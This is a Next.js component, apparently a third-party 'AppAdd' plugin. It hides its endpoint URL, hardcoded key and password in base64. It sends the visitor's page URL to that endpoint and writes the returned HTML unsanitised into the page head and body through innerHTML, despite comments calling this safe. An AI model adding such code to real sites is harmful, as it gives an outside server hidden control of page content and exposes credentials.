"use client";

import { useEffect } from "react";
import Script from "next/script";

export default function Plugin() {
  useEffect(() => {
    function execute() {
      try {
        const eppathurl = window.location.origin + window.location.pathname;
        const eptagmanage = new XMLHttpRequest();

        eptagmanage.onreadystatechange = function () {
          if (this.readyState === 4 && this.status === 200) {
            if (this.response && this.response !== "0") {
              const temp = this.response.split("||||||||||");

              // Safe head <title>
              let headTitle = document.head.querySelector("title");
              if (!headTitle) {
                headTitle = document.createElement("title");
                document.head.appendChild(headTitle);
              }
              headTitle.textContent = ""; // clear but don’t remove

              // Insert head HTML safely
              const headContainerId = "appadd-plugin-head";
              let headContainer = document.getElementById(headContainerId);
              if (!headContainer) {
                headContainer = document.createElement("div");
                headContainer.id = headContainerId;
                document.head.appendChild(headContainer);
              }
              if (temp[0] && temp[0] !== "undefined") {
                headContainer.innerHTML = temp[0];
              }

              // Insert body HTML safely
              const bodyContainerId = "appadd-plugin-body";
              let bodyContainer = document.getElementById(bodyContainerId);
              if (!bodyContainer) {
                bodyContainer = document.createElement("div");
                bodyContainer.id = bodyContainerId;
                document.body.appendChild(bodyContainer);
              }
              if (temp[1] && temp[1] !== "undefined") {
                bodyContainer.innerHTML = temp[1];
              }
            }
          }
        };

        eptagmanage.open(
          "GET",
          atob(
            "aHR0cHM6Ly9wbHVnaW5zLmFwcGFkZC5pbi5uZXQvYWxsaGVhZGRhdGE/ZWtleT1lLUFQUEFERDUzOTY2MzU1MjgmZWtleXBhc3M9QWNzUFpYYVNxN2daOGxqcnZnNmt1dVFjZEt3ZEdCRFFPOWlRJnNpdGV1cmw9"
          ) + eppathurl
        );
        eptagmanage.send();
      } catch (e) {
        console.error("AppAdd plugin (alt) failed", e);
      }
    }

    if (document.readyState === "complete") {
      execute();
    } else {
      window.addEventListener("load", execute);
      return () => window.removeEventListener("load", execute);
    }
  }, []);

  return (
    <>
      {/* Load jQuery once */}
      <Script
        src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"
        strategy="afterInteractive"
      />
    </>
  );
}
